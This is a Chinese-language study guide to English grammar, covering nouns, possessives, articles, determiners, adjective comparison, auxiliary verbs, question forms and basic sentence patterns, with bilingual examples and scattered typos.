There was only one person in the room. （房间里只有一个人） There were many people in the room. （房间里很多人） people: 作为“名族”或“部落”的时候，就是一个普通名词，有单复数变化 The Chinese are an industrious people. （中华名族是一个勤劳的名族） the English-speaking peoples.（说英语的名族） 3、“the + 形容词”表示一类人 在英文中“the + 形容词”表示一类人，此时当做复数名词，作主语时，谓语需要用复数。 The rich are becoming richer.（富人变得更富） 4、复数专有名词 the Alps （阿尔卑斯山脉） the Himalays（喜马拉雅山脉） 5、规则的复数名词 一般在直接加 -s ‘s名词所有格名词的所有格-s 主要用来表示有生命的名词所属关系。如： 姓名：Mary’s brother, Jones’s car 人称：my brother’s car, the lawyer’s office, children’s reading 不定代词：nobody’s fault, everyone’s responsibility 集体名称：the committee’s decision, the company’s accounts 高等动物：the horse’s mouth, a bird’s nest 所有格的构成 单数名词： my sister’s boyfriend the people’s choice a woman’s intuituion 复数名词：不以 -s 或 -es 结尾的名词加's，否者直接加 ' the Children’s Day her friends’ money 并列关系：如果表示共同所有只需要在最后一个名词上加，如果表示各自所有需要在两个名词上都加 John and his wife’s bank savings. （约翰和他的妻子的共同存款） John’s and his wife’s bank savings. （约翰和他的妻子的各自的存款） ‘s 所有格逻辑关系 名词所有格主要来表示所有关系，此外还表示其他关系 所属关系 my father-in-law’s company 主谓关系 How will Bhutto’s death affect the world? （Bhutto之死将会如何影响世界？） 动宾关系 同谓关系 表示世界或者距离 today’s newpaper tomorrow’s weather 表示重量或者价值的度量 two pounds’ weight two dollars’ worth of sugar 表示国家、城市、国际组织或者地理名词 China’s population the moom’s shadow of名词所有格基本构成为：N1 + of + N2 一表示无生命的名词的所有关系。 the roof of the church（教堂的屋顶） the title of the song 二表示有生命的名词后面接短语或从句。 What is the name of the boy sitting next to her?（坐在她身边的那个男孩叫什么名字？）这里的 boy 被分词短语 sitting next to her 修饰，这个时候就不能用 ‘s 所有格，不能说成 What is the boy sitting next to her’s name? ，而是要借助 of 所属格来表示，如果没有分词短语修饰我们可以直接说 What is the boy’s name? I took the advice of an old man I met during a journey and decided to make something of myself.（我听从在一次旅行中遇到的一位老人的建议，决定干出一番事业） of属格的逻辑语义关系 1、主谓关系：从右往左翻， 基本构成是N1 + of + N2，N1是不及物动词变化过来的名词，表示某一行为，这一行为是由N2来发出的。或者说 N2 是 N1 的执行者。 the arrival of my mother（我妈妈到了） 这里的第一个名词 arrival 是有不及物动词 arrive 变化而来的 the arrival of the train（火车到达） the growth of agriculture（农业的增长） 2、动宾关系：从左往右翻译 基本构成是N1 + of + N2，这里的 N1 是有及物动词变化过来的名词，与上述“主谓关系”相反，N1是执行者。 但是对于既可以做为及物动词又可以作为不及物动词，我们一般按动宾关系，从左往右翻译，除非有上下文语义证明。 America’s invasion of Iraq （美国入侵伊拉克） 这里的 invasion 是由及物动词 invade 变化过来的，这个短语相当说 America invaded Iraq the statement of the facts（陈述事实） the discussion of the plan（讨论这个机会） the shooting of the rebels（开枪打死这些叛乱者） 主谓关系：叛乱者开枪扫射 动宾关系：开枪打死这些叛乱者 对于不及物动词，则必然是从右往左按主谓关系翻译，但是对于既可以做为及物动词又可以作为不及物动词，我们一般按动宾关系，从左往右翻译，除非有上下文语义证明。 3、同谓关系。 基本构成是N1 + of + N2，这里的 N2 表示 N1 的具体内容 the city of Rome (罗马城市) the news of the team’s victory（该队胜利的消息） 限定词：冠词我们知道在英语中的冠词有三个，其中两个是不定冠词 a 和 an，以及定冠词 the。但从读音的角度来说应该有4个。 a 用在辅音开头的名词 an 用在元音开头的名词 the [ðə] 在辅音开头的名词 the [ði] 在元音开头的名词 定冠词的泛指和特指： 对应定冠词需要弄明白泛指和特指，泛指表示的是一类事物，特指表示的表示具体的某一个或某一些。 The lion is a dangerous animal.（狮子是一种危险的动物） The lion escaped from the zoo.（那头狮子从动物园跳出来了） 英语中四种泛指的表达式一般有如下规律： 不可数名词不加定冠词表示泛指 复数名词不加定冠词表示泛指 单数名词与定冠词 the 连用可以表示泛指 单数名词和不定冠词 a/an 连用可以表示泛指 1、不可数名词不加定冠词表示泛指 不可数名词在表示泛指的时候不可与 the 连用，如果与 the 连用此时不可数名词表示特指。 Life is hard sometimes.（生活有时会很艰难） Life is education in itself.（生活本身就是教育） The writer is writing write a book about the life of blacks in America.（这位作家正在写一本关于美国黑人生活的书） I am studying the life of Beethoven.（我正在研究贝多芬的生平） I love music, poetry and art.（我爱音乐、诗歌和美术） I don’t like the film, but I like the music.（我不喜欢这部电影，但是我喜欢它的音乐） Water is essential for life.（水是生命不可缺的） Theory must go hand in hand with practice.（理论必须和实践相结合） 2、复数名词不加冠词表示泛指 复数名词同不可数名词一样，在表示泛指的时候，不可与定冠词 the 连用，如果与 the 连用表示特指。 Books fill leisure time for many people.（对于大多数人，书填补了他们很多闲暇时间） Put away the books on your desk.（把你书桌上的那些书都摆齐了） 3、单数名词与定冠词 the 连用可以表示泛指 表示一个典型的样品所代表的那个类别 The tiger is becoming almost extinct.（老虎几乎要灭绝了） Tigers is becoming almost extinct.（老虎几乎要灭绝了） 但是时候就有些困惑“the + 单数名词”既可以泛指也可以特指，就会出现比较模糊的意思。 A: The president is too powerful.（总统权力太大了） B: Which president?（你指的是哪位总统） A: No, I mean presidents in general.（我说的是所有总统） 4、单数名词和不定冠词 a/an 连用可以表示泛指 不定冠词 a/an 的泛指用法指的是某一类事物中的任何一个具有代表性的成员 A tiger is a dangerous animal.（老虎是比较危险的动物） The tiger is a dangerous animal.（老虎是比较危险的动物） Tigers are dangerous animals.（老虎是比较危险的动物） 5、其他 the + 国籍名词表示泛指 The Chinese are a great people.（中华名族是一个伟大的名族） the + 形容词表示一类人，相当于形容词后面省略了 people，所有被看作是复数名词 The poor are causing the nation’s leaders great concern.（穷困人口正在给该国家领导人造成了很大的担忧） The wise avoid such temptations.（真正的智者会抵御这种诱惑） 定冠词 the 的特s指用法指的是跟进说话者和听话者共有的知识或者上下文，可以识别独特的事物。双方都知道指的东西。 1、情景/文化特指 必须依赖说话者和听话者双方的共有的知识。 the 有一条用法表示著名的人或事，这也是相对的，比如刘德华在国内我们可以说著名，到国际上可能就不是。 Albert Einstein, the famous physicist. （爱因斯坦，著名的物理学家） Andy Lau, the famous actor.（刘德华，这位著名的演员）在国内可以这么说 Andy Lau, a famous Chinese actor（刘德华，一位著名的演员）国外的报道可以这样说 一般常识所指 the North Pole（北极） the earth（地球） the univerese（宇宙） 具体知识/局部情景 Have you visited the castle?（你去过那个城堡吗？） Let’t go to the library.（我们去图书馆吧） 即时场景用法，所指双方唯一看到或者听到 A: Shut the door, please!（请把门关一下！） B: Which door?（那个门） 2、上线文共指 指的是听话或者读者可以根据上下文找到所指的。 直接前指 A man came up to a policeman and asked him a qusetion. The policeman didn’t understand the question, so he asked the man repeat it. 间接前指/话题与定冠词the I went to [New York] last week. The traffic is awful.（上周我去了纽约，那里的交通很糟糕） 这里的 The traffic 指的是 New York 的交通 后指/结构特指 The role of women in today’s society has been achieved through centuries of major cultural changes.（经过几个世纪的文化变迁，妇女们已经取得了在当今社会中的低位） 这里的 role 被介词短语 of women 修饰，所以有 the 来限定 role，另外这里的 women是复数名词，表示泛指概念，所以没有用 the 来修饰。 The state of women’s health in the 1990s reflects the price of process.（20世纪90年代妇女的健康状况反应了进步的代价） 这里的 state 被介词短语 of women’s health 修饰，所以用 the 来限定说成 the state，同理 price。 这里的 women’s health 和 progress 都是不可数名词表示泛指，所以都没有用 the 来限制。 People who drink and dirve should go to prision.（酒后驾车应该进监狱） 这个是后表示泛指，不用加 the The people who made this mess should be ashamed of themselves.（把这弄的一团糟的人应该为自己敢到羞耻） 这个表示特指，需要加 the 不定冠词 a/an 的用法1、不定冠词的泛指与非泛指用法 在主语中，具有泛指的功能 A tiger is a dangerous animal. （老虎是一种危险的动物） 用在标语中表示分类，具有描述功能，单数名词在做标语时候，通常需要一个冠词 Bill is a engineer.（比尔是一名工程师） This is a warm day.（这是一个暖和的日子） 2、不定冠词 a/an 与不可数名词 I’d live a beer, please. 3、不定冠词 a/an 与 one 用/不用冠词的意义和区别在英文中，有一类表示居家生活和社会事业机构的名词，hospital 在有冠词修饰和没有冠词修饰的两种不同的情况下，意思往往是不同的。 1、居家类名词 at table（进餐） at the table（在桌子旁边） go to bed（上床睡觉） go to the bed（到床边） 2、住处、建筑场所或社会事业单位 go to hospital（生病住院） redecorate the hospital（重新装修这个医院） in hospital（住院） in the hospital（因事在医院） go to prision（犯罪入狱） walk aroud the prision（绕着这个监狱走） 3、关于上学 go to school（上学） go to the school（去学校） in school（在学校念书） in the school（在学校里） go to class（去上课） The class works hard.（全班同学学校认真） in class（在上课） in the class（在这个班级） go to colleage（去上大学） the gates of the college（这个学院大门） at desk（在读书，做作业） at the desk（在课桌旁） 4、其他 in office（在职） in the office（在办公室） out of office（离职，下台） out of the office（离开办公室） 其他使用冠词的场合1、形容词或副词的最高级、序数词以及only用作形容词加名词连用时，它们的前面一般要用the。 the only way to copy with the problem.（解决这个问题的唯一办法） This is the first time I’ve come to Beijing.（这是我第一次来北京） 2、在乐器、乐团、合唱 the Bealtes（甲壳虫乐队） learn the piano（学钢琴） 在运动项目前不加the，比如：play chess, play football 3、定冠词 the 与姓氏连用 the Smiths（表示夫妇两人或者表示全家人或者整个家族） 其他不用冠词的场合1、关于职业、身份或头衔 表示一般的职业，一般用不定冠词 a/an I am an English teacher. 如果这个职业的头衔是独一无二，或者这个职位在一个单位里面试唯一的，通常不用冠词，不过也可以用 the，所以不能用 a/an。 He was elected President in 1897. I want to see the President. John is (the) captain of the team.（约翰是该队的队长） She is chairman of the committee.（她是该委员会的主席） 2、关于球类、棋类运动 play football play chess 3、关于其他限定词与冠词，这些词彼此排斥，不能同时出现在名词前 冠词：the, an, a 物主形容词：my, your, his, her, our, their 指示形容词：this, that, these, those 名词所属格：Tom’s 但是要注意，所有格本身可以有冠词 the boss’s wife my brother’s girlfriend 4、特殊名词 下列这些特殊名词前，不加 the nature：泛指自然界不加冠词，比如在“大自然中”要说成 in nature If you destory nature you will suffer for it（谁要是破坏大自然，谁就要遭受恶果） society：泛指我们在其中的生活的这个社会，比如在“在社会中”要说成 in society Society turns people into criminals and then locks them up.（社会使人犯罪，然后又把他们关进监狱） space：泛指星球之间的空间，不加冠词。比如“在宇宙太空中”要说成 in space Man has just taken his first into space（对于太空的探索，人类才刚刚迈出了第一步） man：泛指人类时，不加定冠词 Man can conquer nature（人定胜天） hostory：泛指人类的整个历史时候，不加冠词。比如“在历史上”要说成in history History may repeat itself（历史可能重演） 5、关于星期 on + 星期，表示一个规律的日期，或者表示过去或者未来的某个日期 She phoned me on Wednesday and we are meeting on Friday. on the + 星期，表示以上下文中的别的时间为参考 She died on the Tuesday after the accident（事故发生以后的那个星期二，她就死了） 6、关于四季 一般的四季而不是表示具体指的某一段时间，通常不加冠词 Winder is comming 如果特指则需要 The spring fo last year was cold.（去年冬天很冷） 7、关于昼夜的各段时间 dawn/daybreak（黎明/破晓），sunrise（日出）、sunset（日落） 这些名词尤其出现在 at, by, after, before 之后，往往不加冠词 at dawn at sunrise 如果在用的其他介词后，或者是在其他场合，这些名词往往要加冠词 watch the dawn（看黎明到来） We admired the sunset（我们欣赏日落） wake uo int hte nigth（在午夜醒来） 8、关于进餐 一般日常惯例用餐时，通常不加冠词 for breakfast/lunch（早餐，吃午餐） stay for breakfast（留下来吃早餐） before lunch（无餐前） I was invited to dinner（我受邀请赴晚餐） 如果表示特别提出来的某一次用餐，则通常用 the 来强调 Where are we having dinner tonight?（今天的晚餐我们在哪里吃） The dinner after his retirement party was quite lavish 9、关于交通工具 接在by之后的交通的工具名词，前面不要加冠词，其他需要加冠词 the by bicycle / take the bicycle by bus / be on the bus by car / be in the car by boat / take the boat by train / take the train 10、关于通信工具名词 by radio a takle on the radio by telephone John is on the telephone by post put a letter in the post by satellite the satellite is replacing cable TV 11、平行结构 如果两个名词一起放在同一平行结构里，即使是单数可数名词，也通常不加冠词 face to face （面对面） back to back（背对背） day by day（日复一日） 上面带有重复的名词短语具有副词作用，修饰动词，如： They talked face to face.（他们面对面谈话） 限定词：数量限定词和个体限定词数量限定词：a few, few, a little, little1、从名词搭配来看，a few 和 few 的后面只能接复数名词，而 a little 和 little 的后面只能接不可数名词。 a few days, few boys a little water, little money 2、肯定/否定之别，a few 和 a little 表示的意思是肯定，相当于 some，表示有一些的意思。而 few 和 little 的意思是否定，表示很少几乎没有。 His theory is rather difficult; few people understand it.（他的理论很深奥，没有什么人能理解） His theroy is rather difficult, but a few people understand is.（他的理论很深奥，单有一些人能够理解） I have little interest in English, so I am very poor at it.（我对英文没什么兴趣，所以学的很不好） I hava a little interest in English, so i like learn it.（我对英文有些兴趣，所以我喜欢学） 3、与 noly 或 very 的搭配关系，我们只能说 only a little 或 only a few，不能说 only few 或 only little. His theroy is rather difficult and only a few student can understand it. 数量限定词：some/any1、与名词搭配关系 some 和 any 均可以与不可数名词及可数名词复数连用，表示一些。some 一般用于在肯定句中，而 any 一般用于否定句中。 I want to buy some computure books. I don’t have any friends here. 在疑问句中我们多数情况下用 any，但是在表示我们期待的一个正面的回答或者鼓励对方说“是”时，要再疑问句中用 some。 Have you got any medicine to cure you cough?（你吃治咳嗽的药了吗？） Would you live to give me some advice? Can I have some more wine? 2、any 与单数名词搭配 当 any 后面接单数名词时，他的意思是“无论哪一个，任何一个”，此时可用于任何类型的句子。 You can catch any bus. They all go to the railway station.（你坐哪辆公交都行，它们都可以到火车站） You can ask any person over there. They all can tell you.（你问那别的哪个人都行，他们都会告诉你） 3、some 与可数名词搭配 some 与可数名词搭配，此时的 some 表示不确定的“某一个”的意思 Some person at the gate is asking to see you.（门口有个人要见你） 个体限定词：each/every1、与名词搭配关系，each 和 every 的后面都只能接单数可数名词，这就是为什么要称它们为“个体”限定词的原因。它们不能修饰不可数名词和复数名词。 Every boy has a gift. Each boy has a gift. Every man is the master of his own future. 2、二者在词性上的差别 最大的区别是：each 不仅可以用作限定词，而且还可以用作代词；而 every 只能用作限定词。因此，each 用作代词可以单独使用，而 every 只能与名词连用，不能单独使用。 Each has a gift（人人都有礼物） Every boy/Each boy has a gift. Each of the boys has a gift. 如果each用作代词，后面加of短语，此时的of后面必须加限定词，在加复数名词。each of these/the/my boys Every one of the boys has a gift. every不能单独使用，而且在与of短语连用时，只能分开写 every on of… each 可以指两个及两个以上的事物，而 every 只能指三个及三个以上的事物 Each sex has is own physical and psychological characteristics. 男女各有其生理和心理上的特点 性别只有男女两种，不能说 every sex We want every student to succeed in the exam. 我们希望每个学生都可以通过考试 3、与数词的搭配关系 一般来说，each 不能与数词连用，而 every 可与数词连用，然后再加复数名词 every two days（每两天/每隔一天） every four years（每隔三年） 个体限定词：another/other1、与名词的搭配关系 从名词搭配来看，another 不能修饰不可数名词及复数名词，只能与单数可数名词连用，表示不确定的“另一个”，“再一个”。 another day（另一天）而不能说 another days* another cup of water 而不能说 another water 而 other 可与单数名词，复数名词以及不可数名词连用，表示不确定的“另外的”，“其余的”人或物 the other boy（另一个男孩） other boys（其他男孩） other water（其他水） 2、与数词的搭配关系 another three days（还有三天） three more days（还有三天） three other days（其他三天） 个体限定词：either/neither1、与名词搭配 从名词搭配来看，二者都是与单数名词连用，谓语动词用单数。 Either day is Ok. 两天中的哪一天都行 不能说：Either day are OK. Neither day is OK. 两天中的哪一天都不行 不能说：Neither day are OK. 2、二者用作代词 用作代词时，二者不直接接名词，而是单独使用或者接 of 短语 Come over on Saturaday or Sunday. Either is OK.（你周六或者周日过来，哪天都行） Eitehr of the answers is right.（两个答案都是对的） 名词前面必须有限定词，不能说 either of answers* 名词必须用复数，不能说 either of answer* 谓语必须使用单数，不能说 … are right* 限定词总结：限定词中的“二”和“三”1、都：both 和 all 在英文中，both 只表示两者都，而 all 表示三个或三个以上都 Both of us have learned English for a year. All of us have learned English for a year. 2、都不：neitehr 和 none neither 表示两者不，而 none 表示三者以上都不 3、另外一个：the other 和 another the other 表示确定的另外一个，another 表示不清的的另外一个 4、每一个：each 和 every each 表示两个或两个以上的每一个，而every表示从第三个算起的每一个 限定词总结：限定词与可数/不可数名词1、只与单数可数名词搭配的限定词 a, an, each, every, either, neither, another, one 2、只与复数可数名词搭配的限定词 both, few, a few, fewer, a number of, many, serveral, these, those, two 及 two 以上的基数词 3、只与不可数名词搭配的限定词 little, a little, less, much, a bit of, a great amount/deal of 4、既可以与不可数名词也可以与复数名词搭配的限定词 a lot of, lots of, plenty of, more, most 5、同时与单数可数名词、复数可数名词和不可数名词均可以搭配的限定词 any, some, no, the, your, my 限定词总结：限定词与of短语数量或个体词 + of + 特指限定词 + 复数名词或不可数名词 of 后面必须有一个”特指限定词“，才能接名词，否者就是错误的 特指限定词 指示限定词：this, that, these, those 物主限定词：my, your, his, her, their, its, our 名词所有格：Mike’s, the teacher’s 定冠词：the 1、all/most/some/any of + 特指限定词 + 复数或不可数名词 Most of my/these/the books are interesting. Most of books are interesting*.（错误的，of 后面必须有一个”特指限定词“） Most books are interesting.（这样可以） 2、many/a few/few/several/both/two/three of + 特指限定词 + 复数可数名词 Many of these students are good at English. Many students are good at English. 3、much/a little/little of + 特指限定词 + 不可数名词 Much of the water is wasted. Much water is wasted. 注意：其他本身就带有 of 的数量词，如 a lot of, lots of, acouple of, plenty of, a number of, a great deal of 等，则必须直接与名词连用，名词前面不需要加特指限定词。 a lot of books（很多书） 不能说成 a lot of the books* a great deal of water（很多少） 不能说成a great deal of the water* 4、特别关注：all 和 both All students are smart. All of my students are smart. All my students are smart.（all 独特用法） Both students are smart. Both of my students are smart. Both my students are smart.（both 独特用法） 限定词总结：限定词之间的位子关系根据限定词在名词前的位置关系，我们把限定词分为三类：前位限定词，中位限定词和后位限定词。 They questioned both the last two boys.（最后两个男孩他们都提问了） 前位限定词（the） 中位限定词（the） 后位限定词（last two） 1、前位限定词 表示倍数关系的形容词 half my salary（我的工资的一半） double my salary（我工资的两倍） three times my salary（我的工资三倍） 表示几分之几 one third my salary（我的工资的三分之一） two-third my salary（我的工资三分之二） 个体形容词：all 和 both all my salary（我的全部工资） 2、中位限定词 冠词：the/a/an all the book（所有书） half an hour（半个小时） twice the size（两倍的号码） 物主形容词：my, your, his, our all my money all his money 指示形容词：this, that, these, those all these problems four times this amount（这个数量的四倍） 名词属格：John‘s, his father’s all John’s money（约翰所有的钱） 3、后位限定词 基数词或序数词：one/first, two/second, three/third, four/fourth the two children（那两个小孩） his fourth birthday（他的四岁生日） 一般序数词：next, last, past, previous, subsequent, other my next plan our last meeting 数量限定词：few, many, several, little my many friends our several achievement 形容词形容词在名词短语中科院放在修饰名词的前面或后面，于是便构成了前置修饰和后置修饰。 前置修饰名词1、单个名词短语中，通常结构：限定词 + 形容词 + 名词 I am reading an interesting book.（我正在看一个有趣的书） He has a beautiful smile.（他面带灿烂的微笑） a typical mistake（一个典型的错误） 2、多个形容词修饰名词的词序排列 一般规律是：观点形容词 + 描绘形容词 观点形容词：beautiful, good 描绘形容词：white, red, old 后置修饰名词形容词短语作定语，一般只能置于被修饰名词后面 a typical mistake（一个典型的错误） a mistake typical of beginners of English（） 这个名词短语中，单个形容词 typical 作定语，放在修饰的名词 这个名词短语中，typical 后面接有介词短语 of beginners of English，构成形容词短语 the popular songs（这些流行的歌曲） the popular songs popular in the 1970s（这些在20世纪70年度流行的歌曲） 这个名词短语中，单个形容词 popular 作定语，放在修饰的名词 这个名词短语中，popular 后面接有介词短语 in the 1970s，构成形容词短语 1、形容词 + 介词短语 a jacket similar to yours.（一件与你的夹克类似的夹克） 这里的形容词短语 similar to yours 后置修饰 jacket 2、形容词+不定式短语 Parents eager to support their children’s effforts.（非常乐意支持孩子的父母们） eager接不定式短语 to support their children’s efforts Students brave enough to attempt the course deserve to successd.（敢于尝试学这门课的学生当获得成功） brave 接不定式短语 enough to attempt the course 3、形容词 + 动名词短语 a waiter busy serving the guests.（忙于服务客人的服务生） 4、多个形容词并列构成形容词短语 一般放在修饰词后面，而且还用逗号将形容词与句子的其他部分隔开 He bought a set of furniture, simple and beautiful. All countries, larger or small, should be equal. 形容词的比较级和最高级一般来说，形容词（以及副词）具有原级、比较级和最高级这样的三个等级比较。构成形容的比较级和最高级有两种方式： 一种是在词尾加-er 构成的比较级，加-est构成的最高级 一种方式是在形容词前面加 more 构成最高级，加 most 构成的最高级 这两种构成的方式与形容词的音节数目有关。 1、单音节词 a) 一般直接在词尾加-er 和 -est ，分别构成比较级和最高级 原级 比较级 最高级 bright brighter brightest tall taller tallest long longer longest b) 以-e结尾的词，直接在词尾加-r 和 -st 分别构成比较级和最高级 原级 比较级 最高级 brave braver bravest late later latest safe safer safest c) 以 -y 结尾的词应先变 y 为 i，再加 -er 和 -est分别构成比较级和最高级 原级 比较级 最高级 shy shier shiest d) 以”一个元音+辅音“结尾的词，要先双写辅音字母，然后再加-er 和 -est 分别构成比较级和最高级 原级 比较级 最高级 fat fatter fattest big bigger biggest sad sadder saddest 2、双音节词 a) 以 -y 结尾的词应先变 y 为 i，再加 -er 和 -est分别构成比较级和最高级 原级 比较级 最高级 happy happies happiest early earlier earliest heavy heavier heaviest b) 其他绝大多双音节词前加 more 和 most 构成比较级和最高级 原级 比较级 最高级 tiring more tiring most tiring c) 少数几个双音节词分别可以使用上述两种基本方法来构成 原级 比较级 最高级 common commoner/more common commonest/most common 3、多音节 a) 多个音节词都是分别在前面加 more 和 most 来构成比较级和最高级 原级 比较级 最高级 interesting more interesting most interesting excited more excited most excited successful more successful most successful b) 特殊形式的比较级和最高级 原级 比较级 最高级 good/well better best bad/ill worse worest far farther/further farthest/furthest little less least many/much more most late later/latter latest/last 具体用法 father/further：都表示时间的距离，further可用于抽象意义，表示进一步的，更多的，更深入的，常与抽象名词连用 further discussion（继续讨论） further debate（继续争论） further demands（进一步需求） latest：表示最新的 the latest news（最近的消息） 一些不具有等级的形容词： 在英语中有一小部分的形容词，他们没有绝对的含义，因此没有比较级和最高级的形式。常见的这些词包括： absolute（完全的，绝对的） alone（单独的，独一无二的） equal（平等的） dead（死的，无感觉的） perfect（完美的） 尽管这些词没有等级差别，可以用一些副词来修饰，比如：nearly，almost nearly perfect（接近完美的） almost fatal（几乎致命的） nearly dead（奄奄一息的） 形容词的比较级和最高级的用法1、形容词的比较级的用法 a) than 的比较句型 在 than 的前面必须有形容词或副词的比较形式，被比较的两个对象应该是同类事物 The question is less difficult than that question.（这个问题没有那个问题难） 常见的句型是：A + 比较级 + than + B He did much better in the finals this term than last term.（他这个学期的期末考试比上学期考得好多了） 常见句型：A + 比较级 + 情形1 + than + 情形2 b) 比较级与 the 比较级的前面一般不需要加定冠词 the，但在有介词短语 of the two 出现的比较语句中的时候，比较级的前面必须加定冠词 the。 I thinking this painting is the more interesting of the two.（我觉得在这两幅画中有一幅更有意思） i think this painting is more interesting than that that one.（我觉得这幅画比那幅画更有意思） c) more and more 句型 The city is becomming more and more beautiful. That feamale singer is getting fatter and fatter. more and more 不能用作单音节词前面，不能说 more and more fat d) 可以修饰的比较级的词 形容词的比较词前可以用以下表示程度的词，或修饰语来进行修饰：a bit, a little bit, a little, a lot, a great deal, any, even, much, very much, no, rather, still Are you feeling any better?（你有感觉好了一些吗） Things are no better than before.（情况并没有比以前有所改善） e) 否定词+比较级 ”否定意义的词+比较级“可以来表示一个最高级 Few are better qualified for the job than he is. I have never heard a better song.（我从来没有听过这样好的歌） 2、形容词的最高级的用法 a) the + 最高级 + in + 地方 It is the most expensive car in the world.（这是世上最贵的汽车） b) the + 序数词 + 最高级 + in + 地方 The Huanghe River is the second longest river in China. c) the + 形容词/副词的最高级 + of + 所属范围 Cartain zoologists regard crows the most intelligent of birds.（有些动物学家认为，乌鸦是所有鸟类中最聪明的一种鸟） the most intelligent of birds 表示不理解，为什么不说 the most intelligent bird，其实最高级后面省略了代词 one Cartain zoologists regard crows the most intelligent one of birds. Gold is the least of useful of all metals.（在所有金属中，黄金的用途是最小的） Of all metals, gold is the least useful. 我们可以把”of + 范围“这一短语放在句首 d) 最高级前面的定冠词 the 的加与不加 形容词最高级修饰名词用在名词之前，一般加 the This is the most interesting book of all. most 有时候并非表示最高级，而是表示”非常，很“的意思，相当于 very, very much，这个时候一般不加 The story is most interesting. It is most difficult problem. Interesting or Interested1、-ing 形容词的与 -ed 形容词的特点 -ing 形容词主要是用来描述引起人某种感觉的事物，因此句子的主语通常是事物或作定语修饰事物； -ed 形容词主要用来描述人的感觉，表示”人对事物产生的某种感觉“，句子的主语通常是人或有情绪的动物 如： the exciting news（激动人心的消息） the excited man（显得很激动的人) the annoying word（令人气愤的话） the annoyed man（被激怒的人） 2、-ing 形容词修饰人 对应 -ing 修饰人的话，不算奇怪，一般来说，用 -ing 修饰人，是说明这个人能够引起某种情绪。 a boring man（一个烦人的人） a bored man（一个烦闷的人） 3、-ed 修饰物 动词分类：实义动词与（情态）助动词实义动词实义动词的特点： 从词义的角度来看，实义动词具备完整的词汇意义 从在谓语中的作用的角度来看，实义动词能单独充当句子的谓语 英语中除了助动词和情态动词以外，其他均为实义动词 助动词1、助动词 be, do 和 have 助动词的特点 从词义的角度来看，助动词不具备词汇的意义 从在谓语的作用角度来看，助动词不能单独充当句子的谓语，它必须和实义动词连用，以帮助构成各种时态、语态、语气、否定和疑问等 英语的助动词有三个：be, do 和 have，分别有不同的变化形式： be: am, is, are, was, were, been, being I am studing grammer. 帮助构成进行时态 He is playing football. 帮助构成进行时态 I was cheated. 帮助构成被动语态 do: does, did I do not like English. 帮助构成否定 Do you like English. 帮助构成疑问 have: has, had, having I have studied English for 3 years. 帮助构成完成时态 2、用作实义动词的 be, do 和 have 三个助动词 be, do 和 have，同时也可以用作实义动词 be I am a student. 有词义（是），系动词用作谓语 I am studying grammar. 无词义，助动词 have I have two brothers. 有词义（有），用作谓语 I have studied English for 3 years. 无词义，帮助构成完成时态 do I often do my homework at home. 有词义（做），用作谓语 I do not like English. 无词义 情态助动词从词义的角度来看，情态动词有别于助动词。情态动词有其自身的词汇意义，用来表示可能、建议、愿望、必要、允许、能力和怀疑等等，以表示说话者对某种行为或者状态的看法或态度。 从谓语的作用来看，与助动词一样，情态动词在句子中不能单独做句子的谓语，而必须和实意动词一起构成复合谓语。 主要情态动词有10个： can/could, may/might, shall/should, will/would, must 和 had better. 另外还有一些上述情态动词有关的短语： be able to（与can类似） be going to（与will类似） ought to, be supposed to （与should类似） have to, have got to（与must类似） 此外 need 和 dare 既可以用作情态动词，也可以用作实义动词 陈述句的否定陈述句的否定构成有两种：谓语中含有be动词或情态动词的，以及谓语是实义动词的。 1、谓语中含有 be 动词或情态动词的否定 这个时候直接在 be 动词或情态动词后面加否定词 not He is a teacher. He is not a teacher. I can swim. I cannot swim. He will come to the party. He will not come to the party. 2、谓语动词是实义动词的否定 这个陈述的的否定需要借助助动词 do 以及其各种变形来完成 I like English. I do not like English. He likes English. He does not live English I liked English. I did not live English 一般疑问句一般疑问句构成分为两种：谓语中含有 be 动词或情态动词的，以及谓语是实义动词的。 1、谓语动词中含有 be 动词或情态动词的提问 这时构成一般疑问句，只需要将 be 动词或情态动词移到句首 肯定句 疑问句 回答 He is a teacher. Is he a teacher? Yes,he is. 或 No, he isn’t. He can swim. Can he swim? Yes, he can. 或 No, he can’t. 2、谓语动词是实义动词的提问 如果句子是一般将来时，要借助助动词 do 或 does，将 do 或 does 放在句首。如果是一般过去时，则是将 did 放在句首，谓语动词变化动词原形。 肯定句 疑问句 回答 I like English. Do you like English? Yes, I do. 或 No, I don’t. He likes English. Does he like English. Yes, he does. 或 No, he doesn’t. I liked English. Did he like English. Yes, he did. 或 No, he didn’t. 特殊疑问句特殊疑问句是在一般疑问句的基础上变化而来的，其句式为：”特殊疑问句 + 一般疑问句 + ?“。在英语中特殊疑问词有：who, what, which, when, where, why 和 how。 1、不与名词连用的疑问句 a) 对人提问 who He can sing in English. Who can sing in English? I saw him at the party last night. Who did you see at the party last night? b) 对事物或所做的事提问 what I like English. What do you like? I am sudying English grammar. What are you doing? What are you studying? c) 对时间提问 when I was born in 1980. when were you bron? d) 对地点提问 where He lives in Beijing. Where dose he live？ e) 对方式提问 how He does to go school by bus. how does he go to school? f) 对原因提问 why I often sutdy at the libaray because it’s quiet. Why do you often study at the library? 2、要与名词连用的疑问句 a) which 当说话者提供多种选项供对方选择时，我们就要用 which 来提问。此时的 which 的后面通常要接一名词，意思是”哪一个东西“。 A: Could you lend me you pen? B: Sure, I have two pens, This pen has black lnk. That pen has red ink. Which pen/Which one/Which do you wnt? A: That red one. Thanks. b) whose whose 后面必须接名词连用，表示”谁的什么东西“ I borrowed Jack’s car last night. Whose car did you borrow last night? 3、how 的用法 a) how 单独使用时，此时的 how 是对动作的方式提问。 How do you go to work? I drive./By car. I take a bus./ By bus. I walk./ On foot. How did he break his leg? He fell off the ladder. b) how经常与形容词或副词连用 How old are you? How tall is he? How Big is your new hourse? How well does he speak English? 3、对动作的发生频率提问 how often/how many tiems… I write to my parents once a month.（我每个月给父母写一次信） How often do you write to your parents?（你多久给父母写一次信？） How many times a month do you write to your parents?（你每个月给父母写几次信？） 动词分类：英语中的五种基本句型五种基本句型概述之所以要了解这五种基本句型，关键在于谓语动词 Internet dating hurts.（主语+谓语） Chatting on the Internet is interesting.（主语+谓语+表语） I like chatting online.（主语+谓语+宾语） Chatting on the Internet brings me a lot of fun.（主语+谓语+间宾+直宾） We can call Internet addicts a Webaholic.（主语+谓语+宾语+宾语补足语） 句型一：主语+系动词+表语该句型的谓语动词是系动词（如be动词或其他动词），所谓系动词，又叫联系动词，这种动词并不表示具体的动作，而只是起连接主语和后面的成分。 He looks happy. I am a theacher. The music sounds nice. He became a teacher. 常见的系动词： be动词（am, is, are） 其他系动词（looks, sound, smell, taste, feel, seem, appear, become, turn） 